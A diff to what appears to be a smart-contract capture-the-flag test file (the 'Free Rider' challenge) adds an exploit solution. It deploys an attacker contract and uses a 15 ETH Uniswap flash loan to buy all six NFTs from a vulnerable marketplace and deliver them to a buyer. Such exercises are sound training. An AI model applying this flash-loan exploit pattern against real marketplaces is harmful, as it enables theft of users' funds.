@@ -105,6 +105,21 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Execute a flash loan to borrow 15 ETH from uniswap V2 pool
+        // Purhcase all 6 NFTs with 15 ETH
+        // Send the NFTs to the buyer
+        // Pay back the ETH borrowed from the Uniswap V2 pool
+        const FreeRiderAttackerFactory = await ethers.getContractFactory("FreeRiderAttacker", attacker);
+        this.freeRiderAttacker = await FreeRiderAttackerFactory.deploy(
+            this.buyerContract.address, 
+            this.uniswapPair.address, 
+            this.marketplace.address, 
+            this.nft.address, 
+        )
+        const amountToBorrow = ethers.utils.parseEther('15')
+        await this.freeRiderAttacker.connect(attacker).executeFlashLoan(amountToBorrow);
+
+
     });
 
     after(async function () {
